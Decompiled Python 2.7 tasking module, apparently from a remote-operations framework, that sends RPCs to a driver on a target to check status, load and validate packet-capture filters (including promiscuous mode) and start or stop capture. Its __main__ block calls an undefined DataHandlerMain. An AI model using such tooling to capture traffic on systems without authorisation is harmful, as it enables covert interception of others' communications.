# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_TrafficCapture_Tasking.py
CMD_ACTION_GET_STATUS = 0
CMD_ACTION_GET_FILTER = 1
CMD_ACTION_VALIDATE_FILTER = 2
CMD_ACTION_SEND_CONTROL = 3
CAPTURE_CONTROL_START = 1
CAPTURE_CONTROL_STOP = 2

def TaskingMain(namespace):
    import mcl.tasking
    lpParams = mcl.tasking.GetParameters()
    if lpParams['driver'] == None or len(lpParams['driver']) == 0:
        mcl.tasking.OutputError('A driver name must be specified')
        return False
    else:
        if lpParams['action'] == CMD_ACTION_GET_STATUS:
            return _getStatus(namespace, lpParams)
        if lpParams['action'] == CMD_ACTION_GET_FILTER:
            return _getFilter(namespace, lpParams)
        if lpParams['action'] == CMD_ACTION_VALIDATE_FILTER:
            return _validateFilter(namespace, lpParams)
        if lpParams['action'] == CMD_ACTION_SEND_CONTROL:
            return _sendControl(namespace, lpParams)
        mcl.tasking.OutputError('Invalid action (%d)' % lpParams['action'])
        return False
        return


def _getFilter(namespace, lpParams):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.dsky.cmd.trafficcapture', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.dsky.cmd.trafficcapture.tasking', globals())
    tgtParams = mca.dsky.cmd.trafficcapture.ParamsGetFilter()
    tgtParams.driver = lpParams['driver']
    rpc = mca.dsky.cmd.trafficcapture.tasking.RPC_INFO_GET_FILTER
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.dsky.cmd.trafficcapture.errorStrings)
        return False
    return True


def _getStatus(namespace, lpParams):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.dsky.cmd.trafficcapture', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.dsky.cmd.trafficcapture.tasking', globals())
    tgtParams = mca.dsky.cmd.trafficcapture.ParamsGetStatus()
    tgtParams.driver = lpParams['driver']
    rpc = mca.dsky.cmd.trafficcapture.tasking.RPC_INFO_STATUS
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.dsky.cmd.trafficcapture.errorStrings)
        return False
    return True


def _sendControl(namespace, lpParams):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.dsky.cmd.trafficcapture', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.dsky.cmd.trafficcapture.tasking', globals())
    tgtParams = mca.dsky.cmd.trafficcapture.ParamsSendControl()
    tgtParams.driver = lpParams['driver']
    if lpParams['control'] == CAPTURE_CONTROL_START:
        tgtParams.controlType = mca.dsky.cmd.trafficcapture.CONTROL_TYPE_START
    elif lpParams['control'] == CAPTURE_CONTROL_STOP:
        tgtParams.controlType = mca.dsky.cmd.trafficcapture.CONTROL_TYPE_STOP
    else:
        mcl.tasking.OutputError('Invalid control type')
        return False
    rpc = mca.dsky.cmd.trafficcapture.tasking.RPC_INFO_SEND_CONTROL
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.dsky.cmd.trafficcapture.errorStrings)
        return False
    return True


def _validateFilter(namespace, lpParams):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.resource
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.dsky.cmd.trafficcapture', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.dsky.cmd.trafficcapture.tasking', globals())
    if lpParams['filter'] == None or len(lpParams['filter']) == 0:
        mcl.tasking.OutputError('A filter file must be specified')
        return False
    else:
        tgtParams = mca.dsky.cmd.trafficcapture.ParamsValidateFilter()
        tgtParams.driver = lpParams['driver']
        tgtParams.adapterFilter = mca.dsky.cmd.trafficcapture.ADAPTER_FILTER_TYPE_ALL_LOCAL
        tgtParams.adapterFilter |= mca.dsky.cmd.trafficcapture.ADAPTER_FILTER_TYPE_BROADCAST
        tgtParams.adapterFilter |= mca.dsky.cmd.trafficcapture.ADAPTER_FILTER_TYPE_DIRECTED
        if lpParams['promiscuous']:
            tgtParams.adapterFilter |= mca.dsky.cmd.trafficcapture.ADAPTER_FILTER_TYPE_PROMISCUOUS
        filterFile, fullPathToFilename, foundInProject = mcl.tasking.resource.Open(lpParams['filter'], 0, 'Filters')
        if filterFile == None:
            mcl.tasking.OutputError('Failed to open %s' % lpParams['filter'])
            return False
        try:
            import array
            tgtParams.filter = array.array('B', filterFile.read())
        finally:
            filterFile.close()

        rpc = mca.dsky.cmd.trafficcapture.tasking.RPC_INFO_VALIDATE_FILTER
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
        rpc.SetMessagingType('message')
        res = mcl.tasking.RpcPerformCall(rpc)
        if res != mcl.target.CALL_SUCCEEDED:
            mcl.tasking.RecordModuleError(res, 0, mca.dsky.cmd.trafficcapture.errorStrings)
            return False
        return True


if __name__ == '__main__':
    import sys
    try:
        namespace, InputFilename, OutputFilename = sys.argv[1:]
    except:
        print '%s <namespace> <input filename> <output filename>' % sys.argv[0]
        sys.exit(1)

    if DataHandlerMain(namespace, InputFilename, OutputFilename) != True:
        sys.exit(-1)